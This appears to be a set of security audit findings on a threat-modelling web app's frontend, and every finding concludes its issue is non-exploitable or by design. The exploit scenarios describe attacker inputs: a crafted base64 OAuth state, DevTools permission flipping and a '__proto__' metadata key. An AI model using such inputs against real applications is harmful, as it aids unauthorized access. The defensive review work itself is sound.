findings.description: decodeState branches on a loose isBase64 (^[A-Za-z0-9+/]*={0,2}$, length % 4 === 0, length > 16) at lines ~755-765, then compares decodedStoredState.csrf !== decodedReceivedState.csrf (line ~857) with no type/length constraint and no constant-time compare; decoded.csrf is taken from untrusted JSON. The original finding posited an undefined===undefined bypass (received state with no csrf field plus stored state coerced to undefined). Scoring determined this is NOT reachable: the stored state always comes from generateRandomState (localStorage), which always includes a real 32-char-hex csrf and is never attacker-controlled (forcing it to undefined would require XSS/same-origin compromise, at which point CSRF is moot). So an attacker-supplied csrf:undefined compares 'realhex' !== undefined -> true -> validation correctly fails. Genuine code smell (loose isBase64, no constant-time compare, no type guard) but the specific bypass does not hold.
findings.exploit_scenario: Attacker crafts state = base64({"returnUrl":"/x"}) with no csrf field; decodeReceived.csrf === undefined, but the stored csrf is a real crypto hex string, so the comparison fails as intended. No bypass without pre-existing same-origin compromise.
findings.recommendation: After decoding, require typeof csrf === 'string' && csrf.length >= 32 for both stored and received; reject if either is missing. Use a constant-time comparison. Encode an explicit version/marker rather than inferring 'structured' via a loose isBase64 heuristic, so decode is unambiguous.
findings.confidence_reason: Stored state is always generated with a crypto csrf (never attacker-controlled), so the both-undefined precondition for the bypass is unreachable without pre-existing same-origin compromise; real but only a defensive-hardening smell, not the claimed exploitable bypass.

findings.title: All edit/manage gates derive from a single client-side permission calc a user can flip in DevTools (by-design thin-client UX gating)
findings.description: canEdit()/canManagePermissions() (lines ~389-400) and their observable forms return purely from client-side calculateUserPermission, computed in-browser from the profile and the TM authorization list (an in-memory BehaviorSubject). ~71 call sites use these booleans as the only client guard before opening editors and submitting changes; there is no client-side re-check at the point a mutation HTTP call is issued. A user can set the flags true via DevTools and trigger the same code paths that issue real PUT/POST/DELETE to the API. This is the textbook 'frontend authz is UX-only' situation: for a thin client with an authoritative out-of-repo backend (the repo design re-fetches /me via guards and treats the Go backend as authoritative), it is by-design, not a frontend bug — exploitability is entirely backend-contingent and likely mitigated server-side. Reported as a documented defense-in-depth / backend-contract observation.
findings.exploit_scenario: A reader-only user opens a TM, sets canEdit=true in DevTools, edits a threat, and clicks save; the Angular guard passes and the save request is sent. The write succeeds only if the Go backend fails to re-authorize the PUT — the frontend cannot prevent this.
findings.recommendation: Treat client gates strictly as UX. Ensure (and document/test) that every threat-model mutation endpoint on the Go backend re-validates the caller's role server-side. No client change fixes this — it is a backend-contract requirement to verify.
findings.confidence_reason: Code confirms client-side-only UX gating as described, but this is textbook by-design thin-client behavior with an authoritative out-of-repo backend — not an actionable frontend vuln, so low confidence as a real finding.

findings.title: /config.json reflects only non-secret operator env vars to unauthenticated callers (no user input echoed)
findings.description: /config.json (server.js:54-122) builds its JSON body exclusively from process.env.TMI_* values (apiUrl, logLevel, operator name/contact/jurisdiction, auth provider/expiry, feature flags, content providers, a securityConfig block). req is never accessed in the handler — no request header, query parameter, path segment, or body is read or echoed — so there is no reflection/XSS/header-injection vector. The only residual is that the endpoint is unauthenticated and discloses non-secret operator config; it would leak a secret only if an operator misused a TMI_* var to hold one. The threat model itself rates this risk_accepted (T12).
findings.exploit_scenario: An unauthenticated attacker fetches GET /config.json and reads apiUrl, operatorContact, defaultAuthProvider, and feature flags to fingerprint the deployment. Pure reconnaissance; escalates only if an operator places a secret in a TMI_* var.
findings.recommendation: Document that all TMI_* values surfaced via /config.json are world-readable and must never hold secrets. Optionally add an allowlist/serialization guard so only known-public keys are emitted, preventing a future TMI_* var from accidentally leaking. No reflection fix needed.
findings.confidence_reason: Verified no user input reflected; body is solely non-secret TMI_* operator env config — by-design, risk-accepted recon-only disclosure, correctly rated LOW.

findings.title: metadataToRecord writes untrusted metadata keys via bracket assignment without proto guard (non-exploitable today)
findings.description: metadataToRecord (lines ~20-26) does record[entry.key] = entry.value over metadata entries originating from imported/synced diagram cell _metadata (untrusted), with no __proto__/constructor/prototype filter. The same pattern appears in NodeInfo.getMetadataAsRecord and EdgeInfo/DiagramInfo equivalents. However, the Metadata value is typed/coerced to string, and assigning record['__proto__'] = '<string>' is ignored by the __proto__ setter (it only reassigns the prototype for object/null values); record['constructor'] = 'x' merely creates a shadowing own property. So there is no prototype pollution today. Reported as a latent defense-in-depth gap that would become exploitable only if a future change passed non-string values to this path.
findings.exploit_scenario: An imported diagram JSON or WS cell supplies _metadata: [{key:'__proto__', value:'x'}]. Today this is neutralized by string values. If a refactor passed object values to metadataToRecord, the bracket write would reassign the record's prototype, corrupting code that enumerates the record.
findings.recommendation: Add a defensive guard in metadataToRecord and the getMetadataAsRecord reducers: skip keys in {__proto__, constructor, prototype}, or build the record with Object.create(null). Cheap, future-proofs the invariant that string coercion currently provides by accident.
findings.confidence_reason: Real missing proto-guard but non-exploitable today (string values can't pollute via the __proto__ setter); purely latent defense-in-depth, as the finding itself concedes.

findings.title: Role claims documented as JWT-sourced but consumed only via server-validated GET /me (no client-side JWT trust — non-issue)
findings.description: The model comments (lines ~73, 79) state is_admin/is_security_reviewer are 'Populated from JWT tmi_is_administrator claim and verified via GET /users/me.' A full grep of src found NO place where a JWT is decoded client-side to make a role/security decision: the only auth-code atob is OAuth-state CSRF decode, tokens are HttpOnly cookies never read by JS, and roles are assigned solely from the GET /me response body (auth.service.ts:408-409, 1124-1125), which the guards then consume. So the threat-model hypothesis of 'JWT role claims decoded without signature verification and then trusted' does NOT hold in this frontend. Reported as a clarifying NON-issue: the client trusts the server-validated GET /me body over an authenticated same-origin channel, which is appropriate. The comment is misleading but the behavior is sound.
findings.exploit_scenario: No direct client-side exploit: there is no unverified-JWT-to-privilege flow to attack. Forging the GET /me response would require breaking the TLS API channel or compromising the server — outside the frontend's control.
findings.recommendation: No frontend change required for trust correctness. Optionally update the comment to say roles come from the server-validated GET /me body rather than 'from JWT claim,' to avoid implying the client parses JWTs. Ensure GET /me is only ever fetched over TLS to the trusted origin.
findings.confidence_reason: Verified — roles come solely from the server-validated GET /me response body; no client-side JWT decode feeds authorization, so this is a documentation-comment clarification, not a real vuln.
